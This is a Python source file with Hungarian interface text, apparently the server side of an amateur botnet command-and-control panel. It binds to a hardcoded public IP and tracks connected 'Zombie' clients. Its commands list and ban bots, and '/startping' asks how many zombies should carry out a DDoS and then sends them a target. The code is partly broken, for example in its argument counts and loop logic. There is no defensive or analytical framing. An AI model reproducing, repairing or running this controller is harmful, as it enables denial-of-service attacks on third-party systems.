from pydoc import cli
import socket
import select
from turtle import pencolor
from colorama import Fore, Back, Style
import os

HOST = '217.61.7.196'
PORT = 8000
class connects:
    IP = []
    Port = []
    counter = 0
pingers = []
who = ""
class blacklist:
    IP = []
    counter = 0

ACK_TEXT = 'text_received'
class szinek:
    yellow = Fore.YELLOW
    blue = Fore.LIGHTBLUE_EX
    white = Fore.WHITE
    green = Fore.LIGHTGREEN_EX
    red = Fore.RED

def main():    
    os.system('cls||clear')
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((HOST, PORT))
    sock.listen(5)
    print(szinek.green + '= '*10 +'Szerver Elindult'+ ' ='*10 + szinek.white)
    # accept the socket response from the client, and get the connection object
    conn, addr = sock.accept()     # Note: execution waits here until the client calls sock.connect()
    message = "/join"
    sendTextViaSocket(message, conn)
    connects.counter +=1
    connects.IP.append(addr[0])
    connects.Port.append(addr[1])
    print (szinek.green + "ÚJ kapcsolat:")
    print(szinek.blue + "IP: " + szinek.yellow + addr[0]+"\n" +
        szinek.blue + "Port: " + szinek.yellow + str(addr[1])+"\n")

    

    while True:
        message = input(szinek.blue + "\n> " + szinek.yellow)

        if connects.IP in blacklist.IP:
            message = "/ban BLACKLISTED"
            sendTextViaSocket(message, conn)
            print(szinek.red + "Bannolt IP próbált csatlakozni: " + szinek.yellow + addr)
            sock.close()

        if message == "/help":
            print(szinek.blue + "Parancsok:")
            print(szinek.yellow + " "*10 + "/startping [IP] [Target]")
            print(szinek.yellow + " "*10 + "/bots")
            print(szinek.yellow + " "*10 + "/pingek")
            print(szinek.yellow + " "*10 + "/szin [Tesztelendő szín öszetétel]")

        elif message == "/bots":
            print("Csatlakozott Zombie: " + str(connects.counter))
            for i in connects.IP:
                print(i)

        elif message == "/pingek":
            for i in pingers:
                print(i)

        elif message.startswith("/ban"):
            banned = message.replace("/ban ", "")
            if banned == "list":
                print("Bannolt IPk száma: " + str(blacklist.counter))
                for i in blacklist.IP:
                    print(i)
            else:
                for i in connects.IP:
                    if banned in connects.IP:
                        reason = input(szinek.blue + "Indok: " + szinek.red)
                        banned_ip = connects.IP.index(banned)
                        connects.IP.pop(banned_ip)
                        connects.counter-=1
                        blacklist.IP.append(banned)
                        blacklist.counter += 1
                        print(szinek.red + "Kibannoltad a következő IPt: " + szinek.yellow + banned)
                        message = "/ban " + reason
                        sendTextViaSocket(message, conn)
                        sock.close()
                        continue
                    else:
                        print(szinek.red + "Nem található csatlakozó erről az IPről!")
        
        elif message.startswith("/unban"):
            unbanned = input("Unbannolni kívánt IP: " + szinek.blue)
            if unbanned in blacklist.IP:
                blacklist.IP.remove(unbanned)
                blacklist.counter-=1
                print(szinek.green + "Sikeresen unbannoltad a következő IPt: " + szinek.yellow + unbanned)
            else:
                print(szinek.red + "Nincs ilyen bannolt IP!")

        elif message == "/startping":
            how_many = int(input("Hány Zombie ddosoljon: "))
            i = 0
            while i < how_many:
                who = input("IP: ")
                i+=1
            target = input("Target: ")
            message = "/startping " + target
            for i in pingers:
                pingers.append(who + target)
                print(i + " pingeli: " + target)
                sendTextViaSocket(who, message, conn)

        elif message.startswith("/szin"):
            color_test_string = message.replace("/szin ", "")
            print(szinek.yellow + color_test_string)
            print(szinek.blue + color_test_string)
            print(szinek.white + color_test_string)
            print(szinek.green + color_test_string)
            print(szinek.red + color_test_string + szinek.white)
        
        elif message.startswith("/whisper"):
            whisp = message.replace("/whisper ", "")
            message = whisp
            sendTextViaSocket(message, conn)
        
        else:
            print(szinek.red + "Hibás syntax vagy nincs ilyen parancs!")

def sendTextViaSocket(message, sock):
    # encode the text message
    encodedMessage = bytes(message, 'utf-8')

    # send the data via the socket to the server
    sock.send(encodedMessage)

if __name__ == '__main__':
    main()
